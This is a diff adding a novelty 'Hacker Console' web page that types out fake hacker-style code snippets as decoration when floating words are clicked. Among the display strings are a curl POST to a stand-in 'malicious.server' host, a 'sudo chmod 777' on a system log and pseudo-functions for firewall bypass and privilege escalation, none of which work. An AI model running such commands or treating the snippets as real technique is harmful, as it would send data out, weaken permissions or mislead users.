@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Hacker Console</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+            position: relative;
+        }
+        #container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+        .word {
+            position: absolute;
+            cursor: pointer;
+            font-size: 1.2rem;
+            user-select: none;
+            transition: transform 0.2s ease, opacity 0.5s ease;
+        }
+        .word:hover {
+            transform: scale(1.2);
+            text-shadow: 0 0 10px #00ff00;
+        }
+        #output {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 60%;
+            background: rgba(0, 0, 0, 0.95);
+            overflow-y: auto;
+            padding: 10px;
+            box-shadow: inset 0 0 20px #00ff00;
+            font-size: 0.9rem;
+            white-space: pre-wrap;
+        }
+        #cursor {
+            display: inline-block;
+            width: 8px;
+            background-color: #00ff00;
+            animation: blink 1s steps(2, start) infinite;
+            margin-left: 2px;
+        }
+        @keyframes blink {
+            to {
+                visibility: hidden;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="container"></div>
+    <div id="output"></div>
+
+    <script>
+        const container = document.getElementById('container');
+        const output = document.getElementById('output');
+
+        const words = ['init', 'config', 'payload', 'sys', 'core', 'encrypt', 'inject', 'override', 'debug', 'trace'];
+        const codeSnippets = [
+`<html>
+<head><title>Hacker Console</title></head>
+<body><script>console.log("Initializing...");</script></body>
+</html>`,
+`function bypassFirewall() {
+    let attempts = 0;
+    while(attempts < 1000) {
+        sendPacket("ping");
+        attempts++;
+    }
+    return "Firewall bypassed!";
+}`,
+`const payload = {
+    action: "override",
+    target: "system",
+    params: { reboot: true }
+};
+execute(payload);`,
+`import sys
+sys.argv.append("--debug")
+launch();`,
+`let encrypted = encrypt("access_key", "0xdeadbeef");
+console.log("Encrypted:", encrypted);`,
+`sudo chmod 777 /var/log/syslog`,
+`void traceConnection() {
+    start("192.168.1.1");
+    log("Connection traced.");
+}`,
+`curl -X POST http://malicious.server/api -d "data=exploit"`,
+`if(authenticated) {
+    escalatePrivileges();
+}`,
+`while(true) {
+    monitorNetwork();
+}`
+        ];
+
+        // Add blinking cursor span
+        function createCursor() {
+            const span = document.createElement('span');
+            span.id = 'cursor';
+            span.innerHTML = '&nbsp;';
+            return span;
+        }
+
+        function randomPosition() {
+            const x = Math.random() * (window.innerWidth - 150);
+            const y = Math.random() * (window.innerHeight - 50);
+            return {x, y};
+        }
+
+        function createWord() {
+            const word = document.createElement('div');
+            word.classList.add('word');
+            word.innerText = words[Math.floor(Math.random() * words.length)];
+            const pos = randomPosition();
+            word.style.left = `${pos.x}px`;
+            word.style.top = `${pos.y}px`;
+
+            word.addEventListener('click', () => {
+                typeCode(codeSnippets[Math.floor(Math.random() * codeSnippets.length)]);
+                word.style.opacity = '0';
+                setTimeout(() => {
+                    if(container.contains(word)) container.removeChild(word);
+                }, 500);
+            });
+
+            container.appendChild(word);
+
+            setTimeout(() => {
+                if(container.contains(word)) container.removeChild(word);
+            }, 8000);
+        }
+
+        function typeCode(code) {
+            let index = 0;
+            const cursor = createCursor();
+            output.appendChild(cursor);
+
+            function type() {
+                if(index < code.length) {
+                    cursor.before(code[index]);
+                    output.scrollTop = output.scrollHeight;
+                    index++;
+                    setTimeout(type, 20);
+                } else {
+                    cursor.remove(); 
+                }
+            }
+
+            type();
+        }
+
+        setInterval(createWord, 700);
+    </script>
+</body>
+</html>
